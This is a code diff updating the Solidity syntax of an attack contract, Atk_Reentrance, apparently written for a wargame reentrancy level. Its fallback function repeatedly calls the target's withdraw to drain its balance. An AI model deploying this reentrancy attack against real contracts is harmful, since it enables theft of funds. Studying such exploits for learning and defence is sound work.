@@ -34,9 +34,9 @@ contract Atk_Reentrance {
     uint public fund;
     Reentrance public target;
 
-    constructor(address payable addr) payable public {
+    constructor(address addr) public payable {
         owner = msg.sender;
-        target = Reentrance(addr);
+        target = Reentrance(payable(addr));
     }
 
     function set_target(address payable addr) public {
@@ -53,7 +53,7 @@ contract Atk_Reentrance {
         target.withdraw(fund);
     }
 
-    fallback() payable external {
+    fallback() external payable {
         if (address(target).balance > fund) {
             target.withdraw(fund);
         } else if (address(target).balance > 0) {
